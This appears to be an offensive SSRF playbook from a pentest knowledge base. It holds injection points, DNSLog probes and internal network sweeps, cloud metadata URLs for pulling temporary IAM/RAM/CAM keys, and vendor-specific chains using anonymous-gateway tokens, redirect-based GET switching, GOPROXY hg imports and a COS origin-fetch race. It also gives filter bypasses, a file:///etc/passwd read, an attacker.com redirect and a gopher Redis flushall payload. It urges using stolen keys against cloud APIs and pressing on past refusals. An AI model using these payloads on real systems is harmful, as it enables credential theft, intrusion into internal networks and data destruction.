> Quick-hits: search by the entry headings "Cloud metadata path differential" and "Public GOPROXY". The English supplement/attachment was cut; the cloud metadata path differential and its bypasses remain in the upper half.

## 1. Original knowledge base

# SSRF Test Handbook

## Common injection points

```
Image/file URL parameters: imageUrl=, fileUrl=, url=, link=, targetUrl=
Preview/loading features: preview=, fetch=, load=, callback=
Webhook: webhook_url=, notify_url=, redirect_url=
PDF/screenshot generation: pass a URL to generate the screenshot
Model/gateway proxy: path carries proxy, parameters are still targetUrl / url / callback
```

## Detection payloads

### Verifying via DNSLog (blind, no response body)

```bash
# Sign up for a DNSLog domain: dnslog.cn / ceye.io / interact.sh
DNSLOG="your-unique-id.dnslog.cn"

# Send the request
curl "https://target.com/api/preview?url=http://$DNSLOG/test"

# Check the DNSLog platform for any DNS query records
# A record present → SSRF exists
```

### Internal network probing (after SSRF is confirmed)

```bash
# Probe common internal IP ranges
for ip in 192.168.1.{1..254}; do
  echo "?url=http://$ip"
done

# Probe internal service ports
?url=http://192.168.1.1:6379/   # Redis
?url=http://192.168.1.1:27017/  # MongoDB
?url=http://192.168.1.1:8080/   # internal web
?url=http://192.168.1.1:22/     # SSH (infer from response time)
```

### Cloud metadata (high priority)

```bash
# AWS EC2 metadata (critical — can leak IAM credentials)
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# China-cloud ECS metadata
?url=http://100.100.100.200/latest/meta-data/
?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/

# GCP metadata
?url=http://metadata.google.internal/computeMetadata/v1/

# Cloud vendors (if the directory works, still fetch the keys; see "Cloud metadata path differential" below)
?url=http://vendor-metadata-domain/latest/meta-data/
?url=http://vendor-metadata-domain/latest/meta-data/cam/security-credentials/
?url=http://vendor-metadata-domain/latest/meta-data/cam/service-role-security-credentials/<ROLE>
?url=http://169.254.169.254/latest/meta-data/
```

### Cloud metadata path differential / loopback blocked while metadata is not / cloud-dev anonymous proxy (pointed to from quick-hits)

Recognize: cloud vendor metadata; or a cloud-dev / HTTP gateway whose path carries `proxy` and takes `targetUrl` / `url` / `callback`; when anonymous sign-in exists (`signin/anonymously` and the like), you can obtain a token.

Attack:

1. **Loopback comparison.** First hit `http://127.0.0.1/`, then `http://vendor-metadata-domain/latest/meta-data/` and `http://169.254.169.254/latest/meta-data/`. A loopback 403 or `Forbidden Loopback` does not mean the metadata is blocked too. If only the loopback string is filtered and the cloud metadata domain is not re-filtered by resolved IP, keep going.
2. **Key paths.** Once the directory works, first read the role names (the listing under `cam/security-credentials/`). Then grab the temporary keys: `cam/security-credentials/<ROLE>` often 404s — you **must** also hit `cam/service-role-security-credentials/<ROLE>`. Stopping at a 404 because the AWS `iam/security-credentials/` recipe stops there means missing the keys.
3. **Anonymous gateway as the entry.** A token from an official demo environment or anonymous sign-in is **not** "already logged in, within my permissions". Carry it into the `*proxy*` URL parameters. The same endpoint may be disabled in other environments — switch environments and keep trying; do not treat one disabled location as the whole product being secure.
4. **Open proxy pinned to POST.** Directly hitting the metadata and getting 405 (IMDS only accepts GET) ≠ no bug. First hit a public 302 (`redirect-to` type) whose Location points at `http://100.100.100.200/latest/meta-data/ram/security-credentials/<ROLE>`, so the proxy switches to GET while following the redirect. China-cloud roles are listed under `ram/security-credentials/`. Take the keys to STS `GetCallerIdentity`.

Counts as a hit: metadata content echoed in the response, or you obtain `TmpSecretId` / `TmpSecretKey` / `Token` and use all three to call cloud APIs (`GetCallerIdentity` and the like) and match the primary account. Do not stop at a ListBuckets 403 — go on to sign CLS `DescribeConfigs` and read collection configs/topics. Only reading instance-id, a 404 on the keys, or being unable to call through → not a hit yet.

False positives: the proxy only allows a model-vendor whitelist and the metadata also 403s; anonymous sign-in is on but the proxy is locked down for anonymous users; the keys are a narrow role with no proof they can call any cloud API (half a finding — do not claim full-account takeover out of thin air). A single site not hitting is no reason to delete this quick-hits row.

Not a duplicate of the generic "SSRF to `169.254.169.254`": this entry adds **vendor key-path differentials + loopback/metadata filter split + anonymous gateway as the entry**. The public GOPROXY is not a step of this attack; see the next section.

### Public GOPROXY (pointed to from quick-hits)

Recognize: a public GOPROXY (`/go/`, module `/@v/list`) does `?go-get=1` on the module path and then follows the VCS. It is **not** the cloud-dev `*proxy*` from the previous section.

Attack (no sign-in):

1. Write the module path as your own domain.  
2. Use **hg** + `http://vendor-metadata-domain/...` in the page's `go-import` (git over HTTPS usually times out).  
3. RFC1918 Forbidden ≠ the metadata domain is also blocked. If the directory works, fetch the keys via `cam/service-role-security-credentials/<ROLE>` (same as step 2 of the previous section).

Counts as a hit: the hg error/response leaks metadata or the temporary keys, then `GetCallerIdentity` reveals the AccountId.

False positives: not a GOPROXY / the module path does not do `go-get`; the metadata domain is also blocked (not just RFC1918 Forbidden); hg is not followed either and no keys come out; the keys cannot be used. A single site not hitting is no reason to delete this quick-hits row.

## Bypass techniques

```bash
# Bypass IP blacklists
http://127.0.0.1/    → http://2130706433/       # decimal IP
                     → http://0177.0.0.1/        # octal
                     → http://0x7f000001/         # hexadecimal
                     → http://127.1/             # shorthand

# Bypass localhost filters
http://localhost/    → http://[::1]/             # IPv6
                     → http://127.0.0.1.xip.io/ # DNS resolves to 127

# Protocol switching
http://internal-host/ → file:///etc/passwd
                      → gopher://127.0.0.1:6379/_*1... (Redis)
                      → dict://127.0.0.1:6379/info

# URL redirect bypass
Set up a redirect service: http://attacker.com/redirect → 302 → http://169.254.169.254/
```

### COS origin-fetch race (attack only once origin-fetch is present)

Recognize: the business **fetches objects** from COS/OSS, the bucket is configured with "origin-fetch when the object does not exist" toward an origin you control, and you can also PUT and DELETE the **same key**. Do not fire blindly without an origin-fetch configuration.

Attack:

1. Point the origin-fetch at your site, where the origin 302s to metadata or the internal network.  
2. On the same key, PUT on one side (the object exists at check time → no origin-fetch) and DELETE on the other (the object is gone at the real GET → origin-fetch follows the 302). Concurrency: see `race-condition-test.md`.  
3. Watch whether the business download/import hits your origin or the internal network.

Counts as a hit: the business side follows through to the internal network/metadata (in the echoed response, out-of-band, or inside the import result). Merely proving that origin-fetch can be configured, without reaching the internal network → not a hit.

False positives: origin-fetch does not follow 302s; the check and the download go through the same-moment cache; you cannot control the origin-fetch target. Do not add it to quick-hits (it requires you to configure the origin-fetch yourself — too narrow).

## Attacking internal services over gopher

```bash
# Attack Redis (write a webshell or a cron job)
# gopher://127.0.0.1:6379/_RESP-encoded commands
?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A

# Generate gopher payloads with a tool
# gopherus: python gopherus.py --exploit redis
```

---
